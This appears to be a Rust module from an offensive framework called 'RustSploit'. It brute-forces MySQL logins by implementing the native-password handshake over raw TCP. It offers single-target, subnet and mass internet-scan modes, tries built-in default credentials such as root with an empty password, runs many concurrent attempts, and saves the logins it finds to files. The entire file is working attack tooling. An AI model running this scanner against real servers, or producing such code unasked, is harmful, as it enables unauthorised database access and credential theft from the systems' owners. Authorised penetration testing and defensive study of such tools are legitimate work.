//! MySQL Brute Force Module
//!
//! Raw TCP wire-protocol implementation of MySQL native password authentication.
//! Supports single-target, subnet, and mass scan modes.
//!
//! Protocol flow:
//! 1. Read HandshakeV10 packet (protocol version 10)
//! 2. Extract 20-byte auth salt (scramble)
//! 3. Compute auth_response = SHA1(password) XOR SHA1(salt + SHA1(SHA1(password)))
//! 4. Send HandshakeResponse41 packet
//! 5. Read OK (0x00) / ERR (0xFF) response

use anyhow::{anyhow, Result};
use colored::*;
use sha1::{Sha1, Digest};
use std::io::Write;
use std::net::IpAddr;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

use crate::modules::creds::utils::{
    generate_combos_mode, parse_combo_mode, load_credential_file,
    is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
    run_subnet_bruteforce, BruteforceConfig, LoginResult, MassScanConfig, SubnetScanConfig,
};
use crate::utils::{
    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_output_file,
    cfg_prompt_port, cfg_prompt_yes_no, get_filename_in_current_dir, load_lines, normalize_target,
};

// ============================================================================
// Constants
// ============================================================================

const DEFAULT_MYSQL_PORT: u16 = 3306;
const CONNECT_TIMEOUT_MS: u64 = 5000;
const READ_TIMEOUT_MS: u64 = 5000;

const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("root", "root"),
    ("root", ""),
    ("root", "mysql"),
    ("root", "password"),
    ("root", "123456"),
    ("admin", "admin"),
    ("mysql", "mysql"),
    ("root", "toor"),
    ("root", "admin"),
    ("admin", "password"),
];

// MySQL protocol constants
const MYSQL_PROTOCOL_V10: u8 = 10;
const CLIENT_PROTOCOL_41: u32 = 0x0200;
const CLIENT_SECURE_CONNECTION: u32 = 0x8000;
const CLIENT_PLUGIN_AUTH: u32 = 0x0008_0000;
const CHARSET_UTF8: u8 = 33; // utf8_general_ci
const MAX_PACKET_SIZE: u32 = 16_777_216;

// ============================================================================
// Module Info
// ============================================================================

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "MySQL Brute Force".to_string(),
        description: "Brute-force MySQL authentication using native password wire protocol. \
            Implements HandshakeV10 parsing and mysql_native_password auth over raw TCP. \
            Supports default credential testing, wordlist combo mode, subnet scanning, and mass scan."
            .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_connection_phase.html"
                .to_string(),
        ],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

// ============================================================================
// Main Entry Point
// ============================================================================

pub async fn run(target: &str) -> Result<()> {
    crate::mprintln!("{}", "=== MySQL Brute Force Module ===".bold());
    crate::mprintln!("[*] Target: {}", target);

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {} -- Mass Scan Mode", target).yellow());
        return run_mass_scan(
            target,
            MassScanConfig {
                protocol_name: "MySQL",
                default_port: DEFAULT_MYSQL_PORT,
                state_file: "mysql_brute_hose_state.log",
                default_output: "mysql_mass_results.txt",
                default_concurrency: 200,
            },
            move |ip, port| async move {
                if !crate::utils::tcp_port_open(ip, port, Duration::from_secs(5)).await {
                    return None;
                }
                let addr = format!("{}:{}", ip, port);
                // Try common default credentials
                let creds = [
                    ("root", "root"),
                    ("root", ""),
                    ("root", "mysql"),
                    ("admin", "admin"),
                    ("root", "password"),
                    ("root", "123456"),
                ];
                for (user, pass) in creds {
                    match try_mysql_auth(&addr, user, pass).await {
                        MysqlResult::Success => {
                            let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                            return Some(format!("[{}] {}:{}:{}:{}\n", ts, ip, port, user, pass));
                        }
                        MysqlResult::ConnectionError(_) => return None,
                        MysqlResult::AuthFailed | MysqlResult::ProtocolError(_) => {}
                    }
                }
                None
            },
        )
        .await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());

        let port: u16 = cfg_prompt_port("port", "MySQL Port", DEFAULT_MYSQL_PORT).await?;
        let usernames_file =
            cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file =
            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let passes = load_lines(&passwords_file)?;
        if users.is_empty() {
            return Err(anyhow!("User list empty"));
        }
        if passes.is_empty() {
            return Err(anyhow!("Pass list empty"));
        }

        let concurrency: usize = {
            let input = cfg_prompt_default("concurrency", "Max concurrent hosts", "10").await?;
            input.parse::<usize>().unwrap_or(10).max(1).min(256)
        };
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file(
            "output_file",
            "Output result file",
            "mysql_subnet_results.txt",
        )
        .await?;

        return run_subnet_bruteforce(
            target,
            port,
            users,
            passes,
            &SubnetScanConfig {
                concurrency,
                verbose,
                output_file,
                service_name: "mysql",
                jitter_ms: 0,
                source_module: "creds/generic/mysql_bruteforce",
                skip_tcp_check: false,
            },
            move |ip: IpAddr, port: u16, user: String, pass: String| async move {
                let addr = format!("{}:{}", ip, port);
                match try_mysql_auth(&addr, &user, &pass).await {
                    MysqlResult::Success => LoginResult::Success,
                    MysqlResult::AuthFailed => LoginResult::AuthFailed,
                    MysqlResult::ConnectionError(e) => LoginResult::Error {
                        message: e,
                        retryable: true,
                    },
                    MysqlResult::ProtocolError(e) => LoginResult::Error {
                        message: e,
                        retryable: false,
                    },
                }
            },
        )
        .await;
    }

    // --- Single Target Mode ---
    let port: u16 = cfg_prompt_port("port", "MySQL Port", DEFAULT_MYSQL_PORT).await?;

    let use_defaults =
        cfg_prompt_yes_no("use_defaults", "Try default credentials first?", true).await?;

    let usernames_file =
        if cfg_prompt_yes_no("use_username_wordlist", "Use username wordlist?", true).await? {
            Some(cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?)
        } else {
            None
        };

    let passwords_file =
        if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true).await? {
            Some(cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?)
        } else {
            None
        };

    if !use_defaults && usernames_file.is_none() && passwords_file.is_none() {
        return Err(anyhow!(
            "At least one wordlist or default credentials must be enabled"
        ));
    }

    let concurrency: usize = {
        let input = cfg_prompt_default("concurrency", "Max concurrent tasks", "10").await?;
        input.parse::<usize>().unwrap_or(10).max(1).min(256)
    };

    let stop_on_success =
        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(
            cfg_prompt_output_file("output_file", "Output file", "mysql_brute_results.txt").await?,
        )
    } else {
        None
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;

    let retry_on_error =
        cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true).await?;
    let max_retries: usize = if retry_on_error {
        let input = cfg_prompt_default("max_retries", "Max retries per attempt", "2").await?;
        input.parse::<usize>().unwrap_or(2).max(1).min(10)
    } else {
        0
    };

    // Load wordlists
    let mut usernames = Vec::new();
    if let Some(ref file) = usernames_file {
        usernames = load_lines(file)?;
        if usernames.is_empty() {
            crate::mprintln!("{}", "[!] Username wordlist is empty.".yellow());
        } else {
            crate::mprintln!(
                "{}",
                format!("[*] Loaded {} usernames", usernames.len()).green()
            );
        }
    }

    let mut passwords = Vec::new();
    if let Some(ref file) = passwords_file {
        passwords = load_lines(file)?;
        if passwords.is_empty() {
            crate::mprintln!("{}", "[!] Password wordlist is empty.".yellow());
        } else {
            crate::mprintln!(
                "{}",
                format!("[*] Loaded {} passwords", passwords.len()).green()
            );
        }
    }

    // Add default credentials if requested
    if use_defaults {
        for (user, pass) in DEFAULT_CREDENTIALS {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
            if !passwords.contains(&pass.to_string()) {
                passwords.push(pass.to_string());
            }
        }
        crate::mprintln!(
            "{}",
            format!("[*] Added {} default credentials", DEFAULT_CREDENTIALS.len()).green()
        );
    }

    if usernames.is_empty() {
        return Err(anyhow!("No usernames available"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("No passwords available"));
    }

    let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
        combos.extend(load_credential_file(&cred_path)?);
    }

    crate::mprintln!(
        "\n{}",
        format!(
            "[*] Starting MySQL brute-force on {}:{} ({} combos, {} threads)",
            target,
            port,
            combos.len(),
            concurrency
        )
        .cyan()
    );

    let try_login = move |t: String, p: u16, user: String, pass: String| async move {
        let addr = normalize_target(&format!("{}:{}", t, p))
            .unwrap_or_else(|_| format!("{}:{}", t, p));
        match try_mysql_auth(&addr, &user, &pass).await {
            MysqlResult::Success => LoginResult::Success,
            MysqlResult::AuthFailed => LoginResult::AuthFailed,
            MysqlResult::ConnectionError(e) => LoginResult::Error {
                message: e,
                retryable: true,
            },
            MysqlResult::ProtocolError(e) => LoginResult::Error {
                message: e,
                retryable: false,
            },
        }
    };

    let result = run_bruteforce(
        &BruteforceConfig {
            target: target.to_string(),
            port,
            concurrency,
            stop_on_success,
            verbose,
            delay_ms: 0,
            max_retries,
            service_name: "mysql",
            jitter_ms: 0,
            source_module: "creds/generic/mysql_bruteforce",
        },
        combos,
        try_login,
    )
    .await?;

    result.print_found();
    if let Some(ref path) = save_path {
        result.save_to_file(path)?;
    }

    // Unknown / errored attempts
    if !result.errors.is_empty() {
        crate::mprintln!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored MySQL responses.",
                result.errors.len()
            )
            .yellow()
            .bold()
        );
        if cfg_prompt_yes_no(
            "save_unknown_responses",
            "Save unknown responses to file?",
            true,
        )
        .await?
        {
            let default_name = "mysql_unknown_responses.txt";
            let fname = cfg_prompt_output_file(
                "unknown_responses_file",
                "What should the unknown results be saved as?",
                default_name,
            )
            .await?;
            let filename = get_filename_in_current_dir(&fname);
            use std::os::unix::fs::OpenOptionsExt;
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            opts.mode(0o600);
            match opts.open(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# MySQL Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in &result.errors {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    file.flush()?;
                    crate::mprintln!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(())
}

// ============================================================================
// MySQL Wire Protocol Implementation
// ============================================================================

#[derive(Debug)]
enum MysqlResult {
    Success,
    AuthFailed,
    ConnectionError(String),
    ProtocolError(String),
}

/// Read a MySQL packet: 3-byte length (LE) + 1-byte sequence + payload.
async fn read_mysql_packet(stream: &mut TcpStream) -> Result<(u8, Vec<u8>)> {
    let mut header = [0u8; 4];
    tokio::time::timeout(Duration::from_millis(READ_TIMEOUT_MS), stream.read_exact(&mut header))
        .await
        .map_err(|_| anyhow!("Timeout reading MySQL packet header"))?
        .map_err(|e| anyhow!("Failed to read packet header: {}", e))?;

    let length = (header[0] as u32) | ((header[1] as u32) << 8) | ((header[2] as u32) << 16);
    let seq = header[3];

    if length > 65_536 {
        return Err(anyhow!("MySQL packet too large: {} bytes", length));
    }

    let mut payload = vec![0u8; length as usize];
    tokio::time::timeout(
        Duration::from_millis(READ_TIMEOUT_MS),
        stream.read_exact(&mut payload),
    )
    .await
    .map_err(|_| anyhow!("Timeout reading MySQL packet payload"))?
    .map_err(|e| anyhow!("Failed to read packet payload: {}", e))?;

    Ok((seq, payload))
}

/// Write a MySQL packet with the given sequence number.
async fn write_mysql_packet(stream: &mut TcpStream, seq: u8, payload: &[u8]) -> Result<()> {
    let len = payload.len() as u32;
    let header = [
        (len & 0xFF) as u8,
        ((len >> 8) & 0xFF) as u8,
        ((len >> 16) & 0xFF) as u8,
        seq,
    ];
    stream
        .write_all(&header)
        .await
        .map_err(|e| anyhow!("Failed to write packet header: {}", e))?;
    stream
        .write_all(payload)
        .await
        .map_err(|e| anyhow!("Failed to write packet payload: {}", e))?;
    stream
        .flush()
        .await
        .map_err(|e| anyhow!("Failed to flush: {}", e))?;
    Ok(())
}

/// Parse the HandshakeV10 greeting to extract the 20-byte auth salt (scramble).
fn parse_handshake_v10(payload: &[u8]) -> Result<Vec<u8>> {
    if payload.is_empty() {
        return Err(anyhow!("Empty handshake packet"));
    }

    // Check for ERR packet (server rejected connection immediately)
    if payload[0] == 0xFF {
        let msg = if payload.len() > 3 {
            String::from_utf8_lossy(&payload[3..]).to_string()
        } else {
            "Unknown error".to_string()
        };
        return Err(anyhow!("Server error: {}", msg));
    }

    if payload[0] != MYSQL_PROTOCOL_V10 {
        return Err(anyhow!(
            "Unsupported MySQL protocol version: {}",
            payload[0]
        ));
    }

    // Skip protocol version (1 byte)
    let mut pos = 1;

    // Skip server version string (null-terminated)
    while pos < payload.len() && payload[pos] != 0 {
        pos += 1;
    }
    pos += 1; // skip null terminator

    if pos + 4 > payload.len() {
        return Err(anyhow!("Handshake too short (no thread id)"));
    }

    // Skip thread id (4 bytes)
    pos += 4;

    // auth_plugin_data_part_1: 8 bytes
    if pos + 8 > payload.len() {
        return Err(anyhow!("Handshake too short (no salt part 1)"));
    }
    let salt_part1 = &payload[pos..pos + 8];
    pos += 8;

    // Skip filler (1 byte)
    pos += 1;

    // Skip capability_flags_lower (2 bytes)
    if pos + 2 > payload.len() {
        // Some very old servers may stop here; we only have 8-byte salt
        return Ok(salt_part1.to_vec());
    }
    pos += 2;

    // Skip character_set (1 byte), status_flags (2 bytes), capability_flags_upper (2 bytes)
    if pos + 5 > payload.len() {
        return Ok(salt_part1.to_vec());
    }
    pos += 5;

    // auth_plugin_data_len or 0 (1 byte)
    if pos >= payload.len() {
        return Ok(salt_part1.to_vec());
    }
    let auth_data_len = payload[pos] as usize;
    pos += 1;

    // Skip reserved (10 bytes)
    if pos + 10 > payload.len() {
        return Ok(salt_part1.to_vec());
    }
    pos += 10;

    // auth_plugin_data_part_2: max(13, auth_data_len - 8) bytes
    // We need at least 12 more bytes to get the full 20-byte scramble
    let part2_len = if auth_data_len > 8 {
        (auth_data_len - 8).max(12)
    } else {
        12
    };

    let available = payload.len().saturating_sub(pos);
    let take = part2_len.min(available);
    let salt_part2 = &payload[pos..pos + take];

    // Combine: salt_part1 (8) + salt_part2 (up to 12, strip trailing null)
    let mut salt = salt_part1.to_vec();
    for &b in salt_part2 {
        if b == 0 {
            break;
        }
        salt.push(b);
    }

    Ok(salt)
}

/// Compute mysql_native_password auth response.
///
/// auth_response = SHA1(password) XOR SHA1(scramble + SHA1(SHA1(password)))
///
/// For empty passwords, returns an empty Vec (no auth data).
fn compute_native_auth(password: &str, scramble: &[u8]) -> Vec<u8> {
    if password.is_empty() {
        return Vec::new();
    }

    // SHA1(password)
    let sha1_pass = {
        let mut h = Sha1::new();
        h.update(password.as_bytes());
        h.finalize()
    };

    // SHA1(SHA1(password))
    let sha1_sha1_pass = {
        let mut h = Sha1::new();
        h.update(&sha1_pass);
        h.finalize()
    };

    // SHA1(scramble + SHA1(SHA1(password)))
    let sha1_scramble_double = {
        let mut h = Sha1::new();
        h.update(scramble);
        h.update(&sha1_sha1_pass);
        h.finalize()
    };

    // XOR: SHA1(password) ^ SHA1(scramble + SHA1(SHA1(password)))
    sha1_pass
        .iter()
        .zip(sha1_scramble_double.iter())
        .map(|(a, b)| a ^ b)
        .collect()
}

/// Build the HandshakeResponse41 packet payload.
fn build_handshake_response(username: &str, auth_response: &[u8], database: &str) -> Vec<u8> {
    let mut buf = Vec::with_capacity(128);

    // client_flag (4 bytes)
    let flags: u32 = CLIENT_PROTOCOL_41 | CLIENT_SECURE_CONNECTION | CLIENT_PLUGIN_AUTH;
    buf.extend_from_slice(&flags.to_le_bytes());

    // max_packet_size (4 bytes)
    buf.extend_from_slice(&MAX_PACKET_SIZE.to_le_bytes());

    // character_set (1 byte)
    buf.push(CHARSET_UTF8);

    // reserved (23 zero bytes)
    buf.extend_from_slice(&[0u8; 23]);

    // username (null-terminated)
    buf.extend_from_slice(username.as_bytes());
    buf.push(0);

    // auth_response length-encoded
    if auth_response.is_empty() {
        buf.push(0);
    } else {
        buf.push(auth_response.len() as u8);
        buf.extend_from_slice(auth_response);
    }

    // database (null-terminated) -- omit for now; not all servers require it
    if !database.is_empty() {
        buf.extend_from_slice(database.as_bytes());
        buf.push(0);
    }

    // auth plugin name (null-terminated)
    buf.extend_from_slice(b"mysql_native_password");
    buf.push(0);

    buf
}

/// Attempt MySQL authentication against a target address.
async fn try_mysql_auth(addr: &str, username: &str, password: &str) -> MysqlResult {
    // TCP connect with timeout
    let mut stream = match crate::utils::network::tcp_connect(addr, Duration::from_millis(CONNECT_TIMEOUT_MS)).await {
        Ok(s) => s,
        Err(e) => return MysqlResult::ConnectionError(format!("Connect failed: {}", e)),
    };

    // Read server greeting (HandshakeV10)
    let (_seq, greeting) = match read_mysql_packet(&mut stream).await {
        Ok(p) => p,
        Err(e) => return MysqlResult::ProtocolError(format!("Failed to read greeting: {}", e)),
    };

    // Parse the greeting to extract the scramble (salt)
    let scramble = match parse_handshake_v10(&greeting) {
        Ok(s) => s,
        Err(e) => return MysqlResult::ProtocolError(format!("Handshake parse error: {}", e)),
    };

    // Compute auth response
    let auth_response = compute_native_auth(password, &scramble);

    // Build and send HandshakeResponse41
    let response_payload = build_handshake_response(username, &auth_response, "");
    if let Err(e) = write_mysql_packet(&mut stream, 1, &response_payload).await {
        return MysqlResult::ConnectionError(format!("Failed to send auth: {}", e));
    }

    // Read server response
    let (_seq, response) = match read_mysql_packet(&mut stream).await {
        Ok(p) => p,
        Err(e) => {
            return MysqlResult::ConnectionError(format!("Failed to read auth response: {}", e))
        }
    };

    if response.is_empty() {
        return MysqlResult::ProtocolError("Empty auth response from server".to_string());
    }

    match response[0] {
        0x00 => MysqlResult::Success,       // OK packet
        0xFE => MysqlResult::AuthFailed,     // EOF / auth switch request (treat as failure)
        0xFF => {
            // ERR packet: skip error code (2 bytes) + sql_state marker + state (5 bytes)
            let msg = if response.len() > 9 {
                String::from_utf8_lossy(&response[9..]).to_string()
            } else if response.len() > 3 {
                String::from_utf8_lossy(&response[3..]).to_string()
            } else {
                "Unknown error".to_string()
            };
            // MySQL error 1045 = Access denied
            if msg.contains("Access denied") || (response.len() > 2 && response[1] == 0x15 && response[2] == 0x04) {
                MysqlResult::AuthFailed
            } else {
                MysqlResult::ProtocolError(msg)
            }
        }
        other => MysqlResult::ProtocolError(format!("Unexpected response type: 0x{:02X}", other)),
    }
}
